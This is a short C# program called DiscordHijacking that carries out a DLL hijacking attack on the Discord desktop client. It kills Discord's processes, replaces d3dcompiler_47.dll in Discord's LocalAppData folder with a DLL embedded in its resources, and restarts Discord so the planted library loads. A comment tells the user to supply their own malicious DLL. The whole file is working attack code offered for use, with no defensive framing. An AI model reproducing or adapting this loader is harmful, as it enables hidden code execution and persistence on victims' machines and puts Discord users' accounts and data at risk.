using DiscordHijacking.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace DiscordHijacking
{
    internal class Program
    {
        static string hijackDllPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Discord\app-1.0.9012\d3dcompiler_47.dll");
        static string Discord = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Discord\app-1.0.9012\Discord.exe");
        static void Main(string[] args)
        {

            //Please Create your own Dll and add it to the resources

            Process[] proc = Process.GetProcessesByName("Discord");
            if (proc.Length > 0) { KillDiscord(); }
            File.Delete(hijackDllPath);
            byte[] data = Resources.d3dcompiler_47;
            File.WriteAllBytes(hijackDllPath, data);
            Thread.Sleep(50);
            Process.Start(Discord);
            Console.ReadLine();
            Console.ReadLine();
        }
        static void KillDiscord()
        {
            Process[] proc = Process.GetProcessesByName("Discord");
            foreach (Process process in proc) { process.Kill(); Console.WriteLine($"Killed {process.ProcessName}:{process.Id}");  }
        }
    }
}
